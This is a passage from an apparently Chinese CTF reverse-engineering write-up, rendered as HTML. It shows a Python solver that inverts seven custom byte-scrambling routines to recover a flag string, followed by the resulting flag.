class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dec1</span>(<span class="params">cipher: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">bytes</span>:</span></span><br><span class="line">    plain = <span class="built_in">list</span>(cipher)</span><br><span class="line">    tbl = <span class="built_in">bytes</span>.fromhex(<span class="string">&quot;b466efcad9ebb6423614b123b5abd400b0bb96e430a87e5e872daa0147a03dd2dae185f5ff0cfdad07aff2c8739446fce77f1570baf3085f0aa38d1fe6056dc44d31881799c6b26b831c80db6927fac22eec4b2f62a4d339bc6a4a8633bf929144b9cdacf6976ce9906554747609e249f0f9a2139a1632f4823f6f290b5a22b39c4e68d0c1e041ae6428d5048f9f78cc1d180d675be5487b19edd7dd55590e258e2c4012601e10bdc571f851c721c01b45e83ba1f76e2b8cb7d60fde35892a1a7d95d1723ca53411b8525c75ee9bf1fba96179c9203ec337817ccb5798dcbe243a586302d8ea4f43849d064c9efee3a7a68a0356938b7ace385326cfdf775d50&quot;</span>)</span><br><span class="line"></span><br><span class="line">    pp = <span class="string">b&quot;0123456789ABCDEF&quot;</span> * <span class="number">8</span></span><br><span class="line">    ee = <span class="built_in">bytes</span>.fromhex(<span class="string">&quot;3031157034f3365f3839418843994546307f32703435365f38394142439945b23031323334f3363738a34188434445b23031323334f336373839418543994546303132703435365f38a34142434445b2303132703435363738a3414243444546307f323334f3365f3839418843994546307f32333435363738394142434445b2&quot;</span>)</span><br><span class="line">    idxs = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(ee)):</span><br><span class="line">        <span class="keyword">if</span> ee[i] != pp[i]:</span><br><span class="line">            idxs.append(i)</span><br><span class="line"></span><br><span class="line">    cc = <span class="built_in">list</span>(pp)</span><br><span class="line">    <span class="keyword">for</span> idx <span class="keyword">in</span> idxs:</span><br><span class="line">        cc[idx] = tbl[pp[idx]]</span><br><span class="line"></span><br><span class="line">    rr = <span class="built_in">bytes</span>.fromhex(<span class="string">&quot;0b3a177e1fc61b4a70304b8958ad0560115632373b7020731c1a5b55059e658c232e150c31cf3507288173885e5c76ba2200731d2ab0130124117b8501a47d0f3c250b7470021c4617a5434146434ebf2122256d2b101f1c17967a7f00030c096326535653985b2e47bac803d60ed8e597d281868bf4f3f0ebe6a2a7aaabb449&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(cc)):</span><br><span class="line">        plain[i] ^= cc[i] ^ rr[i]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> idx <span class="keyword">in</span> idxs:</span><br><span class="line">        plain[idx] = tbl.index(plain[idx])</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(plain)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dec2</span>(<span class="params">cipher: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">bytes</span>:</span></span><br><span class="line">    plain = <span class="built_in">list</span>(cipher)</span><br><span class="line">    tbl = <span class="built_in">bytes</span>.fromhex(<span class="string">&quot;38393a3b3c3d3e3f404142434445464748494a4b4c4d4e4f505152535455565758595a000102030405060708090a0b0c0d0e0f101112131415161718191a1b1c1d1e1f202122232425262728292a2b2c2d2e2f3031323334353637716e66655e61696b5d64676f5c606a7063685b6d5f626c8788898a8b8c8d8e8f909192939495969798999a9b9c9d9e9fa0a1a2a3a4a5a6a7a8a9aaabacadaeafb0b1b2b3b4b5b6b7b8b9babbbcbdbebfc0c1c2c3c4c5c6c7c8c9cacbcccdcecfd0d1d2d3d4d5d6d7d8d9dadbdcdddedfe0e1e2e3e4e5e6e7e8e9eaebecedeeeff0f1f2f3f4f5f6f7f8f9fafbfcfdfeff72737475767778797a7b7c7d7e7f80818283848586&quot;</span>)</span><br><span class="line"></span><br><span class="line">    rr = <span class="built_in">bytes</span>.fromhex(<span class="string">&quot;f6b0c1702bb6869da6bcba77bde9b92f51db99a5efa3a6d4b8b2bcc0c781342b14dd80ccd0a3e8c0e7c0f79a198205f8b46e99fe90e4ca51afb5e498ca74df8488615077606bf6758083411c1369ac087036514d500731f9b5a9b3efeee95eda7ddf9a71a7c3a6d1deddac03f60de8e65f8c918c97970fd1e3dea2d5db962af9&quot;</span>)</span><br><span class="line">    cc = <span class="built_in">list</span>(<span class="built_in">bytes</span>.fromhex(<span class="string">&quot;680567cabc021234390d1ed230593e9cc250360d412f2e553e2e386c711999bb8f646b9c500264121a186ac43ec4222d93415f434746dd02370b7402256ad50455bf8f97818915916565a6f4fad443f8868aefa6a5fcf10159470c16141db429977f1142703e7e7940727203b2288f6a2ff41971056669f0183c5c4013ae0458&quot;</span>))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x20</span>):</span><br><span class="line">        cc[<span class="number">0x20</span>+i], cc[<span class="number">0x60</span>+i] = cc[<span class="number">0x60</span>+i], cc[<span class="number">0x20</span>+i]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(plain)):</span><br><span class="line">        plain[i] ^= cc[i] ^ rr[i]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x20</span>):</span><br><span class="line">        plain[<span class="number">0x20</span>+i], plain[<span class="number">0x60</span>+i] = plain[<span class="number">0x60</span>+i], plain[<span class="number">0x20</span>+i]</span><br><span class="line"></span><br><span class="line">    rr = <span class="built_in">bytes</span>.fromhex(<span class="string">&quot;680567cabc021234390d1ed230593e9cc250360d412f2e553e2e386c711999bb8f646b9c500264121a186ac43ec4222d93415f434746dd02370b7402256ad50455bf8f97818915916565a6f4fad443f8868aefa6a5fcf10159470c16141db429977f1142703e7e7940727203b2288f6a2ff41971056669f0183c5c4013ae0458&quot;</span>)</span><br><span class="line">    pp = <span class="built_in">bytes</span>.fromhex(<span class="string">&quot;5a69aef84e591d6a7a3a3ef22d6b781f40e463b16a23265316102e227058189d727d445b60503301225206f32b2f0bab7353224a7b2f15072e1b0efe746200706d765af221511a661d763636333033ae707174eb7a43191a1d450f08757071763294020102075d0e4db0bd78a3c8a59ac660d0d1daa7f5f6e1ecd7d0dfd8c958&quot;</span>)</span><br><span class="line">    cc = <span class="built_in">list</span>(pp)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(plain)):</span><br><span class="line">        cc[i] = tbl[pp[i]]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x40</span>):</span><br><span class="line">        cc[i], cc[<span class="number">0x80</span>-i-<span class="number">1</span>] = cc[<span class="number">0x80</span>-i-<span class="number">1</span>], cc[i]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x20</span>):</span><br><span class="line">        cc[i], cc[<span class="number">0x40</span>+i] = cc[<span class="number">0x40</span>+i], cc[i]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(cc)):</span><br><span class="line">        plain[i] ^= cc[i] ^ rr[i]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x20</span>):</span><br><span class="line">        plain[i], plain[<span class="number">0x40</span>+i] = plain[<span class="number">0x40</span>+i], plain[i]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x40</span>):</span><br><span class="line">        plain[i], plain[<span class="number">0x80</span>-i-<span class="number">1</span>] = plain[<span class="number">0x80</span>-i-<span class="number">1</span>], plain[i]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(plain)):</span><br><span class="line">        plain[i] = tbl.index(plain[i])</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(plain)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dec3</span>(<span class="params">cipher: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">bytes</span>:</span></span><br><span class="line">    plain = <span class="built_in">list</span>(cipher)</span><br><span class="line">    tbl = <span class="built_in">bytes</span>.fromhex(<span class="string">&quot;c4189868c047179a23f21a2f75ffd837eb1c7d1861cdf1b74914c18590e1616d7bd4f82307d23443325c3c1aeddff337e4ae04e36d2506bd4ea1f351bd3f8ca1974465b774ac094bdb56552fe61bfc579daa9b47710921084a979b12601de096438c39b57b9bfe9e0e196ceb9a9632a14c5c7e3291bd9017d0db023a8f002eb2&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(plain)):</span><br><span class="line">        plain[i] = (plain[i] - <span class="number">0x80</span>) &amp; <span class="number">0xFF</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x40</span>):</span><br><span class="line">        plain[i], plain[<span class="number">0x80</span>-i-<span class="number">1</span>] = plain[<span class="number">0x80</span>-i-<span class="number">1</span>], plain[i]</span><br><span class="line"></span><br><span class="line">    ret = [<span class="number">0</span>] * <span class="number">128</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(tbl)):</span><br><span class="line">        ret[(<span class="number">0x75</span> + i) % <span class="number">128</span>] = plain[i] ^ tbl[i]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(ret), <span class="number">2</span>):</span><br><span class="line">        ret[i], ret[i+<span class="number">1</span>] = ret[i+<span class="number">1</span>], ret[i]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(ret)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dec4</span>(<span class="params">cipher: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">bytes</span>:</span></span><br><span class="line">    plain = <span class="built_in">list</span>(cipher)</span><br><span class="line"></span><br><span class="line">    pp1 = <span class="built_in">bytes</span>.fromhex(<span class="string">&quot;a53f0c50366abda69abc3ecf6f580d6be2286767b4b24360f7cdf44e9c88f5931131d090a4b71fd9e1e0957144ed5f7dbc2ceceece0a5291bf6db45b822f9587c5954189bf76d9d7bf713f0aa36ceeb414f393794788f7754208923f11de80144e78c441def8bb74decb3a47247b014001990f031fb08b788c3512a3361749d3&quot;</span>)</span><br><span class="line">    cc1 = <span class="built_in">bytes</span>.fromhex(<span class="string">&quot;a642115b4c77f1b5fdba36cb428a409f17f2309fdea03474e6d0f7519f8bf8961434d393a7ba22dce4e3987447f05876b525e5e7c7034b8ab866ad547b289082c0903c84ba71d4d2ba6c3a059e67f5bb1bfa9a804e8ffe7c490f994618e587144e78c441def8bb74decb3a472483094809a1170b27b89380943d1aab3e0c3ec8&quot;</span>)</span><br><span class="line">    dis = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(pp1)):</span><br><span class="line">        dis.append((cc1[i] - pp1[i]) &amp; <span class="number">0xFF</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(plain)):</span><br><span class="line">        plain[i] -= dis[i]</span><br><span class="line">        plain[i] &amp;= <span class="number">0xFF</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(plain)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dec5</span>(<span class="params">cipher: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">bytes</span>:</span></span><br><span class="line">    plain = <span class="built_in">list</span>(cipher)</span><br><span class="line">    tbl = <span class="built_in">bytes</span>.fromhex(<span class="string">&quot;d5a04a5de8a503a8dd2d980a4d8f901234023d5545b73f2cbabc07c70186df532961253e09217b85b60895300bb09e6bdbf9af51844950d210ebac2b48c56a74cdfd1d314bd6f3b381367e9c582f4c6c0513635a419b387c6519d047c4927a6fefb15783271a71d8fa2ae142a28ceaff166400561e374328ab06c9c3d3a614aeb5e6969a9d5f2615f223a7a34e8772ec208059a440f70ce7bb33ede2ee0f8eb20e3c916824754660a17932b8738b76d11fda8d22f00dc011c2e0665ed79ffe88dc7d8aca4404d417c61b94f654694f6de5be3b6ecbf18278f4def5bd2ece67c835ad7752c17fb99339f8e418bfd9cfb489cc5c1cfcaa3a7062fb5be3a99997e9&quot;</span>)</span><br><span class="line"></span><br><span class="line">    pp = <span class="built_in">bytes</span>.fromhex(<span class="string">&quot;9620b6c3418b71c2a79c5d17937f210d436589b31ebb52c12e256660a46e84450c62a3b21370e5b91e840e67b2db5c2cb2cda71df65066990dcc285847021d46dc20489d6664cb3b66a2aca58ed8aa5ec75bedb54cec97d3361233f3ba7f15454cab44fd67625e1e67f6acb3099a2d812d3c2c0a85c2a4b540c507b86a4d6ac6&quot;</span>)</span><br><span class="line">    cc = <span class="built_in">bytes</span>.fromhex(<span class="string">&quot;1e76d27f22bf0ba060c447584fa9b895954c4a32bdc046d036cd250181466efc2f002f48486ec74947015bcc5249878f274d2cfb1ab6a9b9a362ca9cff8f586ac125846ea7c2acf7c225d7662ca5b39e5387ca66b8687d953a4d09b09436291f92e9a38ace7ce6cdd1ba7464e488dc9118143ec808ec822e4438538100d068b3&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(cipher)):</span><br><span class="line">        plain[i] ^= pp[i] ^ cc[i]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x80</span>):</span><br><span class="line">        plain[i] = tbl.index(plain[i])</span><br><span class="line"></span><br><span class="line">    ret = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x30</span>, -<span class="number">1</span>, -<span class="number">0x10</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0xF</span>, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">            ret.append(plain[i+j])</span><br><span class="line">    ret += plain[<span class="number">0x40</span>:]</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(ret)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dec6</span>(<span class="params">plain: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">bytes</span>:</span></span><br><span class="line">    p = <span class="built_in">bytes</span>.fromhex(<span class="string">&quot;cf00fa1ac6497c69840b0c74e6d8c2ad50e23957b7b581e678aac75be30e61d895f5d38858be754f4dcf567f9f1cf0cc89fed6aee83cf43e20c8c8fadbc6f2cbd16eca9559b795199d171848be19fa92a30f49b7dc3ec2f54599d28e29a38546bc459e3b969792d0fb06532ac838a4c8fd72055c12d398bbd1f5ad497a5a831b&quot;</span>)</span><br><span class="line">    c = <span class="built_in">bytes</span>.fromhex(<span class="string">&quot;5a125abad541706a858bf87f4354c5ab409259b7e73511f6589a87ab23de41f885c5d2855fbf7a4d44df76ef7fec30fc005fe6ee885cb41e60e8880a1b16d2ebe11efa65eabc97298c061940be6770a8132f0907acaedbc505dbf2e563b7ad50eec6ee66e6f7b240eb0603bad868f498ed52956c62f3a8cbe1863b497658ae6b&quot;</span>)</span><br><span class="line">    tbl = [p[i] ^ c[i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(p))]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>([tbl[i] ^ plain[i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(plain))])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dec7</span>(<span class="params">cipher: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">bytes</span>:</span></span><br><span class="line">    tbl1 = <span class="built_in">bytes</span>.fromhex(<span class="string">&quot;588d51e8d4d9a5c53094c6bab325c238a4c8aaf74e2e603b3ab2a975a12316fb64e42478322631434bbcb8ac639b7e871b42b59e612a866e4cd2355ad6e9b91db77fa8537bd7de799a745f0bf001ade24a3d98651e6cd8dbabe5442221cb507615565c2972896d418c8e19e1919df2063f1a7d978a8392dc77f936cf48a0c78214e3963984b188284611afa352fe10f457f1e0ca547ca27049a72db6d090da7a67c3bd1cf6f52b9308691359624feaced3eceb5ed10e04204d0f8bbbc9bf03059ccc40dfef853e3cf3ffd50a272fee8f6a1ffd955d817355dde75b6f18c4ae450d689fc012edcd0c33f8fc2c003747bee634a666b0b49971806b07fac1170209&quot;</span>)</span><br><span class="line">    tbl2 = <span class="built_in">bytes</span>.fromhex(<span class="string">&quot;35b3a22a08d483add97fb6c277933814aa1341488d79eca0f6529df8a64d30fa6124b557658ef9f0d1c3c41acd252f676aa44c17686682c7cc6343e987dd8cb2ea3f7cfc6d115db8b1bd562cc186b044056236a8399427ae7b80df73e5e233e3d3cba7859b9991d0006921e66e9806372b8bf42e95a3cf0c7119530410c96b3aee1b88e12397d6f2d54fe4be4270ffe8de5c7db9f126a9843bced2bcc6d83d501c81db2d6045493e587692c512fb9c54ba070290ef477e75af18bb51f5209a9631349f599e46bfa1ca89014a5a1f1e5bf78fb7d7fe5ee01528e7dcda725f55030d64744b29c04e78ab40226f1d09f3a516c8fd6cac8a0fed0a3c327a0b0eebb4&quot;</span>)</span><br><span class="line">    tbl3 = <span class="built_in">bytes</span>.fromhex(<span class="string">&quot;7f9458886cfd2dafe88538c7287bebeeb925894fd2053a0cde8ffccb65ad45c959e12b2f4372c381db8eab010677075e74bc03628c543d3718e279840a307e2e83f95746d15b1a1f116820a76495710b5627a350bbc102e035b582d333ca4a0eef26f413b786acc83ed8759d233b934ca15ab6a0048b8a551922be61e69690c099c69ed7603241f087e9aa175f7c4b1b0d40ffb34269e410faa9d62cf5edbad9480f4ef378d014f7a66eaea870669a52801d34366b5da4ecdf0891ce9c4992a221cc2a6df8bd514d6ae55ce767b0f2f12412989b29b4b197fbc453cdda44e3dd1e6f31dc3cc576ead5f673c28d3f1ccf477aa50039fe7db215d4b863bf9f1609&quot;</span>)</span><br><span class="line">    tbl4 = <span class="built_in">bytes</span>.fromhex(<span class="string">&quot;4f8a646ddee94796105c220be55999d3319533ff1821ab3d2d78291e7758844db99ff851357d2b666ec2b15e2cdc5fd742ae98371fe2439cd94bcadfec9761398334676345366270243f877e467ca203d47394a41da6bb1add8cebd6d8be93feb419a832002a0a11c94ced28f3fc8ea0a1f675c0ce0754fbb512ea914e9dc7746014ac8f385ac152501c539bf1c4e36a4a41b2e8e19071b3cc0c57f9d2ada523bd7615effdbcf5af85dae068f4c8fa69d5256b273b891655db9ee448b69aee80f7170406b0921bcfbf6f86727bf05db713ba050f01e6aa2fc35b7a026ccda32ea9c53c568882e78d3e8120cb0d79f244653a260830a7b84940d07fc6d18b0e09&quot;</span>)</span><br><span class="line">    tbl5 = <span class="string">b&#x27;\x1d\xbcs,\xdb\x81\xe3\x04\x06U\x8dF\xfcQ\x83\x00G\x14v-C\xf8\xc6\x10l\x11\x1c\xc0\x96V\x99\xbd\xd7\xeb\xa8\t\xc4=\x0ci\xea\xfd.j\xbf\x947!\x0fo(\x1f\xa7\x1bg6\x13\xd9\xff\xe8d0?\xf4q+\x8c\\p\&#x27;m@2\xa0z#\xcct\x871\xc1DN\x80&amp;c\x07\x12W\x91&lt;`h|w\xb7\x84\xae\x9c\xc9\xc2\xd0\xc3\x97\xf1B%y$\xc8\x02\xca/\xe4\xf0Or\x92\x0b\xfb\xa3n\xe7\x1eT\xc7\xa4J\xe0\xd5\x86\xb1\xf7\x8bY\xd2\x89\xf5\x08E\n:\x93\xd4\xd6&#125;\xf9&#123;\x85\x9d\xfe\xd3&quot;L;~\xbe\xab\xb0\xb9\xa9\x88\xa6\xda\xbb\xf6\x1a\x05\xde\x18&gt;\x8e\xb4\xfa\xba\xb3\xb8\xb6k\x0eK5\xcb\xec\xdc\x17\x8f \xf2*eb\x82\xf3\xa2\xcf^\xb5\xe6\xce\x9ff\xe9PR\xef[\x9e\xdd\x8a\xe2Iau\xed8\xd8\xd1\xe1)\x15\x98ZS\x01\xa5M\xcd\xc5\x90]\r9\x7f4\xdf_\x16\x03\xee\xa1\xad\x9b\xaf\xb23X\xe5\x19HA\xaa\x95\xac\x9ax&#x27;</span></span><br><span class="line">    tbl6 = <span class="string">b&#x27;V\xd6x\xdc\x8fs\xcf\x8e\x0b\x14\xaa\xfa?=\xc0\xf1)\xde\x8b:t\xb1n\x8cH\xc5\xc4R\xdd.\xd76yD\x7f\xe1\xc1\x99\xd4\x9a\xd8h\xa52WC\x17\xa2\xdf\x87\x82\xf8\xe6\xe7\xb5\x004\xb2\xc9\rX\xaeK\xad\xc3\xc7\x88\x91\n\x051dz&gt;Mb\x06m\xa4\xc6\xe3Bji\xa3\xcc\xb0\x92a\xbf\x8a!Q\x07\xa7-&amp;A\x10\x08\x19\xe2\x1ckr\xca\xb4\x18\x94U\xdaJ\xf3Y^&quot;\x0cE\xbe\xfbG@&#125;\xd0]*\xf2\x0eO/\xcd\x90\x03\x97\xff&lt;\x968\x15\x80\xec\x0f\xc2\x1b\xb3\xeb\x9b~I\xaf&#123;g\x9d$\x86\tf\xf7\\;\xd3\xfd\x04o\x1f\xd9\xb8\xa8ev\x8d\x95\xbb\xb9l\xb7\xee\x01\xf4 `\x1au\xf65\x89%\xbd\x11\x83,\xbcF\xd5\xcb\xab(w\&#x27;\xd2\xc8\xe0\xb6N\xd1\x98\xe9\xcep\xe4P+\xe8\xa1#\xa6\xfe\xedS\x9c\xa9\x127Z[\x81\xbaLT\xf9\x9e\xdb3\xea\x939\x1d\x02qc\x16\x85\x1e\x9f|\xac\xf0\xf5\x84\xef\xa00\xe5\x13_\xfc&#x27;</span></span><br><span class="line">    tbl7 = <span class="string">b&#x27; ;\xec\xbe\xb6\x87\x85\x9fS\xefW\xe0\xc3\x01\xf8:\xe7AKr)\x0bl\x04y\xfc\x18\xb4g\xce\xf0\x0eZ4\x9e\xf6\x94\xacXo\xf3\xc42\x8aU\x9c\x07\xb0e\xe3\x9bRQ\xc7\xddc\xa9\x12\x0f\x95\x80Y\x1a\xcf&#123;0\xa8\xab1/a\x16\x1cMi&quot;p\xcbu&lt;\xd3t\x91\xf1O\xa5\xe2\xfd\xbd\x11m6+\xaa\xd5\x90\xe4\x8d\xda\xb8\xa2\xaf\x1d\x98\x1f\x88*I\x82x\x99\xebGf\xca?\xa6J&amp;\xdfD\x7f\x13\xa4\xb1\x02z\xc9\x9d\x00\xd6^\xbaC\xc2\x03\xff(5\xbcdq\xdc\xa3[\xd4\xee\x83\xf7F-k&#125;\xaeb\xd9\xa7,\xc8\r\xa1\x8ej\xe8`n\xb2@%h\xf4\xb7\xb3w\xc18\xc0\xd8\xd1\xfe\xb9\&#x27;\xbfE]=\x19\xf5\xcc9\xde\x81\x9a3\xc5s\x15\\P\x89N\xa0!$\xdb\xbbV\x17_\xad\xf2\x8c\x8f\x96\x97\xe5T\x86\t\x1bB\x10H\xb5\xf9~|\x05\xd7&gt;\x067\xe6\x93\xfa\xe9v\n\x1e\xed\x0c.\xcd\xfb\x08\xea\x84\x92\xd0\xc6L\xe1#\xd2\x14\x8b&#x27;</span></span><br><span class="line"></span><br><span class="line">    plain = <span class="built_in">list</span>(cipher)</span><br><span class="line">    tbls = [tbl1, tbl2, tbl3, tbl4, tbl5, tbl6, tbl7]</span><br><span class="line">    <span class="keyword">for</span> tbl <span class="keyword">in</span> tbls[::-<span class="number">1</span>]:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(plain)):</span><br><span class="line">            plain[i] = tbl.index(plain[i])</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(plain)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">target = <span class="built_in">bytes</span>([<span class="number">121</span>, <span class="number">23</span>, <span class="number">66</span>, <span class="number">107</span>, <span class="number">59</span>, <span class="number">80</span>, <span class="number">122</span>, <span class="number">227</span>, <span class="number">70</span>, <span class="number">208</span>, <span class="number">222</span>, <span class="number">78</span>, <span class="number">36</span>, <span class="number">167</span>, <span class="number">138</span>, <span class="number">106</span>, <span class="number">105</span>, <span class="number">208</span>, <span class="number">2</span>, <span class="number">6</span>, <span class="number">240</span>, <span class="number">39</span>, <span class="number">36</span>, <span class="number">189</span>, <span class="number">192</span>, <span class="number">187</span>, <span class="number">227</span>, <span class="number">30</span>, <span class="number">9</span>, <span class="number">163</span>, <span class="number">151</span>, <span class="number">48</span>, <span class="number">60</span>, <span class="number">182</span>, <span class="number">235</span>, <span class="number">104</span>, <span class="number">144</span>, <span class="number">9</span>, <span class="number">208</span>, <span class="number">234</span>, <span class="number">17</span>, <span class="number">242</span>, <span class="number">196</span>, <span class="number">96</span>, <span class="number">165</span>, <span class="number">203</span>, <span class="number">195</span>, <span class="number">252</span>, <span class="number">69</span>, <span class="number">251</span>, <span class="number">92</span>, <span class="number">83</span>, <span class="number">192</span>, <span class="number">128</span>, <span class="number">58</span>, <span class="number">153</span>, <span class="number">89</span>, <span class="number">111</span>, <span class="number">47</span>, <span class="number">84</span>, <span class="number">74</span>, <span class="number">217</span>, <span class="number">14</span>, <span class="number">106</span>, <span class="number">52</span>, <span class="number">222</span>, <span class="number">210</span>, <span class="number">236</span>, <span class="number">175</span>, <span class="number">74</span>, <span class="number">11</span>, <span class="number">164</span>, <span class="number">138</span>, <span class="number">182</span>, <span class="number">250</span>, <span class="number">147</span>, <span class="number">31</span>, <span class="number">4</span>, <span class="number">16</span>, <span class="number">68</span>, <span class="number">238</span>, <span class="number">228</span>, <span class="number">214</span>, <span class="number">158</span>, <span class="number">244</span>, <span class="number">69</span>, <span class="number">18</span>, <span class="number">77</span>, <span class="number">55</span>, <span class="number">60</span>, <span class="number">240</span>, <span class="number">17</span>, <span class="number">248</span>, <span class="number">200</span>, <span class="number">68</span>, <span class="number">118</span>, <span class="number">99</span>, <span class="number">16</span>, <span class="number">115</span>, <span class="number">45</span>, <span class="number">104</span>, <span class="number">215</span>, <span class="number">157</span>, <span class="number">47</span>, <span class="number">195</span>, <span class="number">132</span>, <span class="number">42</span>, <span class="number">182</span>, <span class="number">204</span>, <span class="number">181</span>, <span class="number">55</span>, <span class="number">97</span>, <span class="number">79</span>, <span class="number">15</span>, <span class="number">22</span>, <span class="number">188</span>, <span class="number">187</span>, <span class="number">140</span>, <span class="number">83</span>, <span class="number">39</span>, <span class="number">238</span>, <span class="number">119</span>, <span class="number">170</span>, <span class="number">31</span>, <span class="number">156</span>, <span class="number">194</span>, <span class="number">24</span>, <span class="number">222</span>])</span><br><span class="line"></span><br><span class="line">decs = [dec1, dec2, dec3, dec4, dec5, dec6, dec7]</span><br><span class="line"><span class="keyword">for</span> func <span class="keyword">in</span> decs[::-<span class="number">1</span>]:</span><br><span class="line">    target = func(target)</span><br><span class="line"><span class="built_in">print</span>(target.decode())</span><br></pre></td></tr></table></figure><p>得到一串神奇 flag：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">:*D#O+_I3;`&#125;0NfP-=2/+Y&quot;_&gt;A8S6]L|4G;UHiA5mnol^k;#OhW2!UEJf0&quot;7?Dt5m&#123;CqE*AZr~$1(zW@TBXKL&amp;2r?+3kwxC90O&#x27;%&amp;PyVo~)&#x27;Q%Z@6b&#125;REKF[cgFe/-?I</span><br></pre></td></tr></table></figure><hr><p>PS. 本题解同样发表在<a 